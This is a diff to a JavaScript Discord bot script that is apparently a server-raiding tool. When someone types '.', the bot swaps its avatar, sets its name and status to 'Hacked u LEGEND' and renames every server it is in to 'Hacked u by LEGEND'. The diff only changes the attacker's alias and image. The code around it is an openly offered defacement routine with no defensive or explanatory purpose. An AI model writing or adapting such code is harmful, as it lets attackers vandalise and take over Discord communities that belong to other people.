@@ -33,20 +33,20 @@ LOka.on("message", message => {
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/461211380272594944/461216212991344650/Avaar.png`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by LEGND-YT")
+LOka.user.setUsername("Hacked u LEGEND")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by LEGEND`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u LEGND-YT`)
+             m.setName(`Hacked u by LEGEND`)
 })
 }
 });
@@ -76,6 +76,7 @@ LOka.on('message', message => {
 });
  
 LOka.on('message', message => {
+     
      
  
      if (message.content === "k1") {
